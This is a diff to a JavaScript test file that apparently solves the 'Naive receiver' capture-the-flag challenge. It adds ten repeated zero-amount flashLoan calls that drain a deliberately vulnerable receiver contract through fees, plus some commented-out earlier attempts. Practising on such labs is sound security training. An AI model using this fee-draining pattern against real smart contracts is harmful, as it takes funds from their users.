@@ -1,6 +1,9 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+//import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+//import "@openzeppelin/contracts/utils/Address.sol";
+
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
 
@@ -31,6 +34,21 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        //const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+        //var bad_receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
+
+        //this.receiver.functionCallWithValue(abi.encodeWithSignature("receiveEther(uint256)", 1), 9);
+        //await this.receiver.receiveEther(10);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
+        await this.pool.flashLoan(this.receiver.address, 0);
     });
 
     after(async function () {
